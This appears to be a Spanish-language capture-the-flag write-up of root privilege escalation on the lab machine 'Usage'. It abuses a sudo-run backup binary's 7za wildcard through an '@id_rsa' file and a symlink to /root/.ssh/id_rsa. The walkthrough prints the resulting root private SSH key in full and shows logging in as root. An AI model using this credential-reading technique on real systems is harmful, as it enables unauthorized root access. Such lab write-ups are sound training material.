Comprobamos que el binario `usage_managment` se trata de un ejecutable `ELF`. Por otro lado, verificamos el hash `MD5` del binario y verificamos en `Virus Total` que al parecer se trata de un binario personalizado para la máquina `Usage`.

```bash
xander@usage:~$ file /usr/bin/usage_management
/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped

xander@usage:~$ md5sum /usr/bin/usage_management
f3c1b2b1ccacc24cc7ed8f3ad62bb7c6  /usr/bin/usage_management
```

<figure><img src="../../.gitbook/assets/imagen (491).png" alt=""><figcaption></figcaption></figure>

Revisaremos el funcionamiento del binario, en el cual disponemos de 3 opciones:

* Project Backup --> Realiza una copia de seguridad y lo almacena en `/var/backups/projects.zip`.
* Backup MySQL data --> Realiza una copia de seguridad de MySQL.
* Reset admin password --> Realiza un restablecimiento de la contraseña de `admin`.

{% tabs %}
{% tab title="Project Backup" %}
```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17993 files, 113887659 bytes (109 MiB)                       

Creating archive: /var/backups/project.zip

Items to compress: 20977

                                                                               
Files read from disk: 17993
Archive size: 54849834 bytes (53 MiB)
Everything is Ok
```
{% endtab %}

{% tab title="Backup MySQL data" %}
```bash
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 2       
xander@usage:~$ 
```
{% endtab %}

{% tab title="Untitled" %}
```bash
ander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 3
Password has been reset.
```
{% endtab %}
{% endtabs %}

Por otro lado, comprobamos a través de `strings` sobre cadenas visibles que se encuentren en el binario para verificar cómo funciona.

Identificamos que el binario `usage_management`, ubicado en el sistema, ejecuta el siguiente comando para generar copias de seguridad:

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

Este uso de `7za` presenta una vulnerabilidad que permite la lectura arbitraria de archivos. Según la documentación de `HackTricks`, cuando `7za` encuentra un archivo con el prefijo `@`, lo interpreta como una lista de archivos que debe comprimir. Si tenemos la capacidad de crear archivos en el directorio donde se ejecuta el comando, podemos aprovechar este comportamiento para forzar la lectura de archivos arbitrarios.

```bash
xander@usage:~$ strings /usr/bin/usage_management
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.
```

{% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7z" %}



```bash
root@usage:/usr/bin# ls -l usage_management 
-rwxr-xr-x 1 root root 16312 Oct 28  2023 usage_management
root@usage:/usr/bin# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```



```bash
❯ wget 10.10.11.18:8080/usage_management
--2025-03-07 02:22:44--  http://10.10.11.18:8080/usage_management
Conectando con 10.10.11.18:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 16312 (16K) [application/octet-stream]
Grabando a: «usage_management»

usage_management                                          100%[==================================================================================================================================>]  15,93K  --.-KB/s    en 0,06s   

2025-03-07 02:22:45 (247 KB/s) - «usage_management» guardado [16312/16312]

❯ chmod +x usage_management
```

Desde `GHIDRA` también logramos visualizar el funcionamiento del binario.

<figure><img src="../../.gitbook/assets/imagen (493).png" alt=""><figcaption></figcaption></figure>

### Exploitation custom binary to get root shell

Para explotar esta vulnerabilidad y leer la clave privada SSH del usuario root, primero nos ubicamos en el directorio donde se ejecuta **7za**. Luego, creamos un archivo llamado `@id_rsa` para indicar que **7za** debe tratar `id_rsa` como una lista de archivos a comprimir.

A continuación, creamos un enlace simbólico llamado `id_rsa` que apunta a `/root/.ssh/id_rsa`. De esta forma, cuando **7za** intente leer `id_rsa`, en realidad accederá a la clave privada de root y la mostrará en un error, permitiéndonos obtener su contenido.

```bash
xander@usage:/$ cd /var/www/html/
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ ls -l
total 8
-rw-rw-r--  1 xander xander    0 Mar  7 00:10 @id_rsa
lrwxrwxrwx  1 xander xander   17 Mar  7 00:10 id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
```

Al ejecutar el binario `/usr/bin/usage_management` a través de la opción `1` que es la que ejecuta el `7za` finalmente logramos leer el archivo `id_rsa` del usuario `root`.

```bash
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54849834

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17994 files, 113888058 bytes (109 MiB)                         

Updating archive: /var/backups/project.zip

Items to compress: 20978

                                                                               
Files read from disk: 17994
Archive size: 54849975 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```

Copiaremos el contenido en nuestra máquina local en un archivo llamado `id_rsa`, el cual deberemos de tratar para eliminar los carácteres que no nos interesen.

Le daremos los permisos correspondientes para poder hacer uso de la clave privada y trataremos de acceder con el usuario `root`.

Finalmente, logramos obtener acceso al equipo a través del usuario `root` y la clave privada `id_rsa`sin necesidad de proporcionar credenciales. Por último, visualizamos el contenido de la flag **root.txt**.

```bash
❯ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files

❯ cat id_rsa | sed 's/ : No more files//g' | sponge id_rsa

❯ chmod 600 id_rsa

❯ ssh -i id_rsa root@usage.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Apr  8 01:17:46 PM UTC 2024

  System load:           1.9072265625
  Usage of /:            64.8% of 6.53GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             254
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.18
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5616


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~# cat /root/root.txt 
f4087***************************
```
